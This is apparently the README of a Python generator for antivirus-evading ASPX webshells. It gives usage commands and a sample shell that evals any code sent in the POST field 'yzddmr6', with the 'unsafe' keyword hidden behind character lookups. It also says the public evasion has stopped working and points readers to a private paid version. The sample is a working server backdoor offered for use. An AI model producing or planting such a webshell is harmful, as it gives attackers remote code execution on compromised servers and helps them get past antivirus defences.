# 2019.8.14

已知免杀已失效，获取星球内部版请戳

https://yzddmr6.tk/2019/08/13/webshell-venom-notice/

## 使用方法

`python3 aspx_venom.py`

保存:

`python3 aspx_venom.py >  test.aspx`

生成样例:
```
<%@ Page Language="Jscript" Debug=true%>
<%
var UdIw='hVYFCrBEjfzQsUkdgOReSAKXntawHGiWPvTpqJxmLZbylcuMNDIo';
var YJxe=Request.Form("yzddmr6");
var zIUt=UdIw(13)+UdIw(24)+UdIw(12)+UdIw(21)+UdIw(3)+UdIw(7);
eval(YJxe,zIUt);
%>
```
